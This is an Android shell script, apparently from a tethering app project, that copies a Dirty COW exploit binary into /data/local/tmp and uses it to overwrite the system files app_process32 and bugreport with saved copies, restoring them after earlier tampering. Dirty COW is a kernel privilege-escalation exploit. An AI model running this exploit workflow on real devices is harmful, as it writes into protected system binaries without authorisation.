#!/system/bin/sh

log -t syshell running reset.sh
APPFILES=/data/data/com.example.marto.tether/files/
#TMPDIRTYCOW=/data/data/com.example.marto.tether/files/dirtycow.tmp
TMPDIRTYCOW=/data/local/tmp/dirtycow.tmp
# duplicate dirtycow but with the context of shell
log -t syshell "ID: "
log -t syshell $(/system/bin/id 2>&1)
log -t syshell copying dirtycow binary to $TMPDIRTYCOW
log -t syshell $(/system/bin/cp -v ${APPFILES}dirtycow $TMPDIRTYCOW 2>&1)
log -t syshell setting tmp dirtycow to executable
log -t syshell $(/system/bin/chmod +x $TMPDIRTYCOW 2>&1)

log -t syshell restoring app_process32
$TMPDIRTYCOW /system/bin/app_process32 ${APPFILES}app_process32old
log -t syshell restoring bugreport
$TMPDIRTYCOW /system/bin/bugreport ${APPFILES}bugreport
